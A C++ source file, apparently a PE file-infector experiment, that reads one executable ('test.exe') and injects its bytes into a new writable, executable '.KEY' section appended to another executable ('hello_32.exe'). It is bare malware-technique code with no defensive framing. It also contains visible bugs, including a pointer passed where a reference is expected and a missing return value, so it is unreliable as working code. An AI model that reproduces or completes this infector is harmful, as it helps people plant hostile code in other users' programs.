#include<Windows.h>
#include<iostream>
using namespace std;
unsigned align(unsigned size, unsigned align, unsigned addr) {
	if (!(size % align)) return addr + size;
	return addr + (size / align + 1) * align;

}
BYTE* get_infected_byte(wchar_t* filename,unsigned &size) {
	HANDLE infected_file = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL,NULL);
	 size = GetFileSize(infected_file, NULL);
	BYTE* byte_infected = new BYTE[size];
	DWORD num;
	cout << size << '\n';
	ReadFile(infected_file, byte_infected, size, &num, NULL);
	return byte_infected;
}
bool addSection(wchar_t* filename, char* sectionName, DWORD sizeOfSection) {
	HANDLE file = CreateFile(filename, GENERIC_WRITE | GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) return false;
	unsigned fileSize = GetFileSize(file, NULL);
	BYTE* pByte = new BYTE[fileSize];
	DWORD num;
	ReadFile(file, pByte, fileSize, &num, NULL);
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) return false;
	PIMAGE_FILE_HEADER fh = (PIMAGE_FILE_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD));
	PIMAGE_OPTIONAL_HEADER oh = (PIMAGE_OPTIONAL_HEADER)(pByte + dos->e_lfanew + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER));
	PIMAGE_SECTION_HEADER sh = (PIMAGE_SECTION_HEADER)(pByte + dos->e_lfanew + sizeof(IMAGE_NT_HEADERS));

	ZeroMemory(&sh[fh->NumberOfSections],sizeof(IMAGE_SECTION_HEADER) );
	CopyMemory(&sh[fh->NumberOfSections].Name, sectionName, 8);

	sh[fh->NumberOfSections].Misc.VirtualSize = align(sizeOfSection, oh->SectionAlignment, 0);
	sh[fh->NumberOfSections].VirtualAddress = align(sh[fh->NumberOfSections - 1].Misc.VirtualSize,oh->SectionAlignment,sh[fh->NumberOfSections-1].VirtualAddress );
	sh[fh->NumberOfSections].SizeOfRawData = align(sizeOfSection, oh->FileAlignment, 0);
	sh[fh->NumberOfSections].PointerToRawData = align(sh[fh->NumberOfSections - 1].SizeOfRawData, oh->FileAlignment, sh[fh->NumberOfSections - 1].PointerToRawData);
	sh[fh->NumberOfSections].Characteristics = IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE | IMAGE_SCN_CNT_UNINITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
	SetFilePointer(file, sh[fh->NumberOfSections].PointerToRawData + sh[fh->NumberOfSections].SizeOfRawData, NULL, FILE_BEGIN);
	SetEndOfFile(file);
	oh->SizeOfImage = sh[fh->NumberOfSections].VirtualAddress + sh[fh->NumberOfSections].Misc.VirtualSize;
	fh->NumberOfSections += 1;
	SetFilePointer(file, 0, NULL, FILE_BEGIN);
	WriteFile(file, pByte, fileSize, &num, NULL);
	CloseHandle(file);
}
bool addCode(wchar_t* filename,BYTE* byte_infected,unsigned sizeInfected) {
	HANDLE file = CreateFile(filename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) return false;
	unsigned fileSize = GetFileSize(file,NULL);
	BYTE* pByte = new BYTE[fileSize];
	DWORD num;
	ReadFile(file, pByte, fileSize, &num, NULL);
	PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pByte;
	PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pByte + dos->e_lfanew);

	PIMAGE_SECTION_HEADER first = IMAGE_FIRST_SECTION(nt);
	PIMAGE_SECTION_HEADER last = first + (nt->FileHeader.NumberOfSections -1);
	SetFilePointer(file, last->PointerToRawData,NULL,FILE_BEGIN);
	
	WriteFile(file, byte_infected, sizeInfected, &num, 0);
	CloseHandle(file);
	return true;

		
}
int main() {
	wchar_t file_infect[] = L"test.exe";
	unsigned size;
	BYTE* byte_infected = get_infected_byte(file_infect,&size);
	
	wchar_t file_host[] = L"hello_32.exe";
	char sec[] = ".KEY";
	if (addSection(file_host, sec, size)) {
		printf("section add\n");
		if (addCode(file_host, byte_infected,size)) {
			printf("CODE ADD\n");
		}
	}
	else {
		printf("ERROR SECTION ADD");
	}
}
